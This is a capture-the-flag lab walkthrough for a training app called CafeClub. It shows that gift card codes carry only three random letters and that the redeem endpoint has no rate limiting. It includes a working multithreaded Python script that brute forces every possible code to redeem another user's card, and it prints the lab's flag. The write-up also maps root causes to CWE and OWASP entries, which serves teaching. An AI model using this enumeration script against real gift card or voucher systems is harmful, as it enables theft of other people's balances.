# cafeclub-004 - BugForge Lab Walkthrough

**URL:** https://lab-1783082026192-bxtmna.labs-app.bugforge.io/
**Difficulty:** Easy
**Vulnerability:** Predictable gift card codes with no rate limiting - brute force redemption of another user's card
**Flag:** `bug{rIJ78Ec0oDghtpGDiB7q1eXLa6iPfPsL}`

---

## Summary

CafeClub lets users buy and redeem gift cards. Codes look like `CAFE-XXXX-XXXX-XXXX` in the UI, but the actual issued format is `CAFE-<MMDD>-A???` - a fixed prefix, the current date, a constant leading `A`, and only 3 random uppercase letters of real entropy. That is 26^3 = 17,576 possibilities. The redeem endpoint has no rate limiting and gives a clean valid/invalid signal, so any card in the system can be brute forced and redeemed into an attacker's own account. A seeded victim card carried the flag in its redemption response.

---

## Tech Stack

- React SPA (CRA build, source maps exposed) with MUI
- Express.js backend
- JWT auth (HS256)
- Gift card / loyalty points economy

---

## Key Endpoints

| Endpoint | Method | Auth | Notes |
|----------|--------|------|-------|
| `/api/register` | POST | No | Requires username, email, password. Returns JWT |
| `/api/giftcards/purchase` | POST | JWT | Returns a new code `CAFE-0307-A???` |
| `/api/giftcards/redeem` | POST | JWT | `{"code":...}` - success with balance, or invalid code error |
| `/api/giftcards` | GET | JWT | Lists redeemed cards and total balance |

---

## Discovery

### Step 1 - Read the client source

The app's JS bundle exposes a source map. Pulling `components/GiftCards.js` out of it confirms the redeem flow is a simple `POST /api/giftcards/redeem` with a `code` field, and the purchase flow returns the new code directly in the response.

### Step 2 - Register and purchase gift cards

```bash
curl -s -X POST $TARGET/api/register -H 'Content-Type: application/json' \
  -d '{"username":"attackerx","email":"attacker1996x@evil.com","password":"Password123!"}'
```

Purchasing gift cards repeatedly returns codes like:

```
CAFE-0307-AYQV
CAFE-0307-AQSQ
CAFE-0307-AHLQ
CAFE-0307-ANSM
CAFE-0307-AGTH
```

Every code shares the same `CAFE-0307-A` prefix. Seven identical leading characters across independent draws is not something a properly random code would produce. Sampling roughly 50 codes and breaking down the last block character by character confirms position 0 is always `A`, and positions 1 to 3 are uniformly distributed A-Z. The middle block `0307` is just today's date. Effective keyspace is 26^3 = 17,576.

### Step 3 - Check for rate limiting

Thirty rapid redeem requests against invalid codes all return promptly with a clear signal:

```json
{"error":"Invalid gift card code"}
```

No throttling, no lockout, no delay increase.

### Step 4 - Brute force

A 40-thread script iterates every `CAFE-0307-A???` combination (excluding codes already known to be mine) and calls redeem for each:

```python
import urllib.request, json, itertools, string, threading, queue

TARGET = "https://lab-1783082026192-bxtmna.labs-app.bugforge.io"
token = "<jwt>"

q = queue.Queue()
for a, b, c in itertools.product(string.ascii_uppercase, repeat=3):
    q.put("A" + a + b + c)

def worker():
    while True:
        try:
            suffix = q.get_nowait()
        except queue.Empty:
            return
        code = "CAFE-0307-" + suffix
        req = urllib.request.Request(
            TARGET + "/api/giftcards/redeem",
            data=json.dumps({"code": code}).encode(),
            headers={"Content-Type": "application/json",
                     "Authorization": "Bearer " + token})
        try:
            r = urllib.request.urlopen(req, timeout=15)
            print("HIT", code, r.read().decode())
        except urllib.error.HTTPError:
            pass

threads = [threading.Thread(target=worker) for _ in range(40)]
for t in threads: t.start()
for t in threads: t.join()
```

After roughly 13,000 of 17,576 combinations (about 2 minutes at 40 concurrent threads), the scan hits a valid, unowned card:

```json
{"message":"Gift card redeemed successfully","balance":10,
 "original_amount":10,"flag":"bug{rIJ78Ec0oDghtpGDiB7q1eXLa6iPfPsL}"}
```

---

## Dead Ends

| Attempt | Why it failed |
|---------|--------------|
| Mass assignment (`role: "admin"`) on register | Server ignores the field, role stays "user" |
| Short/invalid `card_number` on purchase | Server returns a validation error and does not issue a code |
| Assuming all three code blocks were random | Wrong - only the last block has entropy, and only 3 of its 4 characters vary |

---

## Root Cause

Gift card codes are generated with almost no entropy: a fixed brand prefix, the current date, a constant leading character, and 3 random letters. Combined with an unthrottled redeem endpoint and no binding between a code and the account it was issued to, ownership of a gift card is enforced only by the secrecy of a 17,576-value code, which is trivially brute forceable.

---

## CWE / OWASP

- **CWE-330**: Use of Insufficiently Random Values
- **CWE-307**: Improper Restriction of Excessive Authentication Attempts
- **CWE-639**: Authorization Bypass Through User-Controlled Key
- **OWASP API4:2023** - Unrestricted Resource Consumption
- **OWASP API1:2023** - Broken Object Level Authorization
